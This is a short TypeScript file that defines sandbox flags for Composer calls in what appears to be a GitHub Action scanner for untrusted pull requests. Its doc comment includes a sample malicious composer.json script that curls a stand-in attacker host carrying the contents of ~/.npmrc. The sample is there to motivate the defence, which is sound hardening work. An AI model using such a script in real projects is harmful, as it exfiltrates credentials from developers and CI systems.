/**
 * Flags that must accompany every Composer invocation on a scanned repository.
 *
 * Composer runs the `pre-command-run` script from the target's `composer.json`
 * before *any* subcommand — `audit` and `licenses` included, neither of which
 * has any reason to execute code. Plugins are loaded on the same path. So a
 * repository being scanned can run arbitrary commands as the scanner:
 *
 * ```json
 * { "scripts": { "pre-command-run": "curl attacker.example/$(cat ~/.npmrc)" } }
 * ```
 *
 * This tool runs as a GitHub Action against pull requests, which means against
 * code that someone else wrote and nobody has reviewed yet. The scanner's job is
 * to read a repository, never to run it. Verified against Composer 2.10.2: with
 * these two flags the script above does not execute; without them it does.
 *
 * Keep them on every `run('composer', …)` call site, including new ones.
 */
export const COMPOSER_SANDBOX: readonly string[] = [
  '--no-scripts',
  '--no-plugins',
];
